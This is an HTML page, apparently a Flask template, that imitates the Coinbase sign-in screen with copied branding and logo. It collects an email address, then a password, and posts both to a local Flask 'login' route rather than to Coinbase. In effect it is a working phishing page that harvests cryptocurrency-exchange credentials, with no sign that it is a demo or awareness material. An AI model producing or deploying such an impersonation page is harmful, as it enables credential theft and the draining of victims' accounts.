<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Coinbase</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            color: #0a0b0d;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            min-height: 100vh;
            padding: 40px 20px 24px;
        }

        .login-card {
            background-color: #ffffff;
            width: 100%;
            max-width: 400px;
            border: 1px solid #f0f0f0;
            border-radius: 16px;
            padding: 40px 32px 36px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Coinbase Official 'C' Monogram Logo */
        .logo-container {
            width: 48px;
            height: 48px;
            margin-bottom: 24px;
        }

        .coinbase-logo {
            width: 100%;
            height: 100%;
        }

        .title {
            font-size: 22px;
            font-weight: 600;
            color: #0a0b0d;
            margin-bottom: 8px;
            text-align: center;
            letter-spacing: -0.2px;
        }

        .subtitle {
            font-size: 14px;
            color: #5b616e;
            text-align: center;
            margin-bottom: 28px;
            line-height: 20px;
        }

        /* View Switching Mechanism */
        .view {
            display: none;
            width: 100%;
            flex-direction: column;
            align-items: center;
        }

        .view.active {
            display: flex;
        }

        .user-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-size: 14px;
            font-weight: 500;
            color: #0a0b0d;
            margin-bottom: 24px;
            background-color: #f4f5f8;
            padding: 8px 16px;
            border-radius: 20px;
        }

        .edit-badge-btn {
            color: #0052ff;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
        }

        .edit-badge-btn:hover {
            text-decoration: underline;
        }

        /* Forms & Inputs */
        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .input-group {
            position: relative;
            width: 100%;
        }

        .input-field {
            width: 100%;
            height: 56px;
            padding: 22px 16px 6px;
            background-color: #ffffff;
            border: 1px solid #d5d9d9;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            color: #0a0b0d;
            transition: border-color 0.15s, box-shadow 0.15s;
        }

        .input-field:focus {
            border-color: #0052ff;
            box-shadow: 0 0 0 2px rgba(0, 82, 255, 0.2);
        }

        .input-label {
            position: absolute;
            left: 16px;
            top: 18px;
            font-size: 15px;
            color: #5b616e;
            pointer-events: none;
            transition: all 0.15s ease;
        }

        .input-field:focus ~ .input-label,
        .input-field:not(:placeholder-shown) ~ .input-label {
            top: 8px;
            font-size: 11px;
            color: #0052ff;
            font-weight: 600;
        }

        .input-field:not(:focus):not(:placeholder-shown) ~ .input-label {
            color: #5b616e;
        }

        .eye-btn {
            position: absolute;
            right: 14px;
            top: 18px;
            background: none;
            border: none;
            cursor: pointer;
            color: #5b616e;
            display: flex;
            align-items: center;
        }

        .forgot-link {
            font-size: 14px;
            font-weight: 600;
            color: #0052ff;
            text-decoration: none;
            align-self: flex-start;
            margin-top: -2px;
            margin-bottom: 4px;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        /* Buttons */
        .btn-primary {
            width: 100%;
            height: 52px;
            background-color: #0052ff;
            border: none;
            border-radius: 26px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.15s, transform 0.1s;
            margin-top: 4px;
        }

        .btn-primary:hover {
            background-color: #0045d8;
        }

        .btn-primary:active {
            transform: scale(0.99);
        }

        .divider {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 20px 0 16px;
            color: #5b616e;
            font-size: 13px;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #eceff1;
        }

        .divider span {
            padding: 0 12px;
        }

        .social-btn {
            width: 100%;
            height: 48px;
            background-color: #ffffff;
            border: 1px solid #d5d9d9;
            border-radius: 24px;
            color: #0a0b0d;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: background-color 0.15s;
        }

        .social-btn:hover {
            background-color: #f7f9fa;
        }

        /* Footer */
        .footer-links {
            display: flex;
            gap: 20px;
            font-size: 12px;
            color: #5b616e;
            margin-top: 32px;
            flex-wrap: wrap;
            justify-content: center;
        }

        .footer-links a {
            color: #5b616e;
            text-decoration: none;
            font-weight: 500;
        }

        .footer-links a:hover {
            color: #0052ff;
        }

        /* Hidden field */
        .hidden-field {
            display: none;
        }
    </style>
</head>
<body>

    <main class="login-card">
        <!-- Official Coinbase Icon SVG -->
        <div class="logo-container">
            <svg class="coinbase-logo" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect width="48" height="48" rx="24" fill="#0052FF"/>
                <path d="M24 12C17.3726 12 12 17.3726 12 24C12 30.6274 17.3726 36 24 36C30.6274 36 36 30.6274 36 24H27C27 25.6569 25.6569 27 24 27C22.3431 27 21 25.6569 21 24C21 22.3431 22.3431 21 24 21C25.6569 21 27 22.3431 27 24H36C36 17.3726 30.6274 12 24 12Z" fill="white"/>
            </svg>
        </div>

        <h1 class="title">Sign in to Coinbase</h1>
        <p class="subtitle" id="form-subtitle">Enter your email address to continue.</p>

        <!-- STEP 1: Email Input -->
        <div id="step-email" class="view active">
            <form class="login-form" id="email-form">
                <div class="input-group">
                    <input type="email" id="email-input" class="input-field" placeholder=" " required autofocus />
                    <label for="email-input" class="input-label">Email address</label>
                </div>

                <button type="submit" class="btn-primary">Continue</button>

                <div class="divider">
                    <span>or</span>
                </div>

                <button type="button" class="social-btn">
                    <svg width="18" height="18" viewBox="0 0 24 24">
                        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
                        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
                    </svg>
                    Sign in with Google
                </button>
            </form>
        </div>

        <!-- STEP 2: Password Input -->
        <div id="step-password" class="view">
            <div class="user-badge">
                <span id="display-email">user@example.com</span>
                <span class="edit-badge-btn" id="btn-edit-email">Edit</span>
            </div>

            <!-- PASSWORD FORM: posts email as username, password as password to Flask -->
            <form class="login-form" id="password-form" action="{{ url_for('login') }}" method="POST">
                <!-- Hidden field for email (username) -->
                <input type="hidden" name="username" id="hidden-email" value="">

                <div class="input-group">
                    <input type="password" id="password-input" name="password" class="input-field" placeholder=" " required />
                    <label for="password-input" class="input-label">Password</label>
                    <button type="button" class="eye-btn" id="toggle-pwd" aria-label="Toggle password visibility">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                            <circle cx="12" cy="12" r="3"></circle>
                        </svg>
                    </button>
                </div>

                <a href="#" class="forgot-link">Forgot password?</a>

                <button type="submit" class="btn-primary">Sign in</button>
            </form>
        </div>
    </main>

    <footer class="footer-links">
        <a href="#">Privacy Policy</a>
        <a href="#">Terms of Service</a>
        <a href="#">Help Center</a>
    </footer>

    <script>
        const emailForm = document.getElementById('email-form');
        const emailInput = document.getElementById('email-input');
        const displayEmail = document.getElementById('display-email');
        const formSubtitle = document.getElementById('form-subtitle');
        
        const stepEmail = document.getElementById('step-email');
        const stepPassword = document.getElementById('step-password');
        const btnEditEmail = document.getElementById('btn-edit-email');
        const passwordInput = document.getElementById('password-input');
        const togglePwd = document.getElementById('toggle-pwd');
        const hiddenEmail = document.getElementById('hidden-email');

        // Transition from Step 1 to Step 2
        emailForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const val = emailInput.value.trim();
            if (val) {
                displayEmail.textContent = val;
                hiddenEmail.value = val;   // set hidden field for submission
                formSubtitle.textContent = 'Enter your password to sign in.';
                stepEmail.classList.remove('active');
                stepPassword.classList.add('active');
                passwordInput.focus();
            }
        });

        // Edit Button Action
        btnEditEmail.addEventListener('click', () => {
            formSubtitle.textContent = 'Enter your email address to continue.';
            stepPassword.classList.remove('active');
            stepEmail.classList.add('active');
            emailInput.focus();
        });

        // Toggle Password Visibility
        togglePwd.addEventListener('click', () => {
            const isPassword = passwordInput.getAttribute('type') === 'password';
            passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
        });
    </script>

</body>
</html>
